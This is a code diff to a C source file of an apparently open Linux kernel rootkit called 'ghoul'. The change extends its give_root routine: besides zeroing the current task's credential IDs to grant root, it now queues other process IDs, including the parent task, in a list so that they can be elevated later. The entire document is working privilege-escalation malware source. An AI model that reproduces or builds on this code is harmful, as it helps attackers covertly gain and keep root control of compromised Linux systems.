@@ -1,7 +1,10 @@
 #include <linux/kernel.h>
 #include <linux/sched.h>
 #include <linux/cred.h>
+#include <linux/slab.h>
 #include "privileges.h"
+
+LIST_HEAD(pids_waiting_for_root);
 
 void set_root(void)
 {
@@ -10,6 +13,8 @@ void set_root(void)
 
     if (creds == NULL)
         return;
+    
+    pr_info("ghoul: giving root to PID %d\n", current->pid);
 
     creds->uid.val = creds->gid.val = 0;
     creds->euid.val = creds->egid.val = 0;
@@ -21,21 +26,21 @@ void set_root(void)
 
 void give_root(int pid)
 {
-    struct task_struct *current_task;
-    
-    pr_info("ghoul: giving root to pid %d\n", pid);
+    struct pid_list *pid_entry;
 
-    /*
-     * We currently don't handle requests to give root to other tasks.
-     * Giving root to other tasks is more complex because we can only give root to ourselves.
-     * To give root to another task, we need to save its PID, and hook a function that runs when the task is scheduled,
-     * like finish_task_switch.
-     * Once that function runs, we can give that task root from within its context.
-     */
-    current_task = current;
-    if (pid == THIS_TASK || pid == current_task->pid)
-    {
+    // give root to current task
+    if (pid == THIS_TASK || pid == current->pid) {
         set_root();
         return;
     }
+
+    // request to give root to parent task - find its PID
+    if (pid == PARENT_TASK)
+        pid = current->parent->pid;
+    
+    // add PID to list of PIDs waiting for root
+    pr_info("ghoul: scheduled request to give root to PID %d\n", pid);
+    pid_entry = kmalloc(sizeof(struct pid_list), GFP_KERNEL);
+    pid_entry->pid = pid;
+    list_add_tail(&pid_entry->list, &pids_waiting_for_root);
 }
